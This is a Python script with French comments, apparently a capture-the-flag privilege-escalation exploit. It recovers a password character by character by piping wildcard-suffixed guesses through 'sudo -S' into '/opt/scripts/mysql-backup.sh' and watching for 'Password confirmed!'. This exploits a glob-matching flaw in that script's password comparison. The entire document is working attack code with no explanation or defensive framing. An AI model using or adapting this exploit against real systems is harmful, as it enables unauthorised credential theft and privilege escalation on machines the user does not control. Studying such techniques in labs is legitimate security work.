import subprocess
import string

def main():
    # Créer une liste de tous les caractères possibles (lettres alphabétiques et chiffres)
    chars = list(string.ascii_letters + string.digits)

    # Initialiser une chaîne vide pour le mot de passe
    pswd = ""

    # Indicateur pour vérifier si tous les caractères du mot de passe ont été trouvés
    tous_caracteres_trouves = False

    while not tous_caracteres_trouves:
        for char in chars:
            # Construire la commande pour tester le mot de passe
            cmd = f"echo '{pswd}{char}*' | sudo -S /opt/scripts/mysql-backup.sh"

            # Exécuter la commande et récupérer la sortie
            out = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

            # Vérifier si la sortie confirme que le mot de passe est correct
            if "Password confirmed!" in out:
                # Ajouter le caractère trouvé au mot de passe
                pswd += char

                # Sortir de la boucle une fois que le caractère a été trouvé
                break
            else:
                # Poursuivre la recherche si le caractère n'est pas trouvé
                pass
        else:
            # Si aucun caractère n'est trouvé, tous les caractères du mot de passe sont présents
            tous_caracteres_trouves = True
            print("[+] Mot de passe: " + pswd)

if __name__ == "__main__":
    main()

